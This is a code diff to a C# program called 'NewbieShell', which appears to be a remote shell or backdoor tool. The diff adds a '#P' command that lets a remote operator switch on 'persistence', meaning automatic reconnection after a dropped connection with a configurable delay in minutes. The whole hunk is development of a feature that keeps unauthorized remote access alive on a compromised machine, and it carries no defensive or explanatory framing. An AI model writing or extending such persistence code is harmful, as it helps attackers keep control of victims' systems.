@@ -351,6 +351,42 @@ namespace NewbieShell
                                             sw.Flush();
                                             Console.WriteLine(ex.Message);
                                         }
+									else if (sb.ToString().ToUpper() == "#P")
+                                    {
+                                        sb.Remove(0, sb.Length);
+
+                                        sw.Write("Do you want to reconnect in case of a connection failure. Y or N: ");
+                                        sw.Flush();
+                                        string answer = rdr.ReadLine();
+
+                                        if (answer.ToUpper() == "Y")
+                                        {
+                                            persistence = true;
+
+                                            sw.Write("After how many minutes should the connection be established?: ");
+                                            sw.Flush();
+                                            answer = rdr.ReadLine();
+                                            int number = 0;
+
+                                            bool isparsable = Int32.TryParse(answer, out number);
+
+                                            if (number != 0 && isparsable)
+                                            {
+                                                reconnecttimer = number;
+                                            }
+                                            else
+                                            {
+                                                reconnecttimer = 5;
+                                            }
+
+                                            sw.WriteLine("Persistence activated!");
+                                            sw.Flush();
+
+                                        }
+                                        else
+                                        {
+                                            persistence = false;
+                                        }
                                     }
                                     // Standard command
                                     else
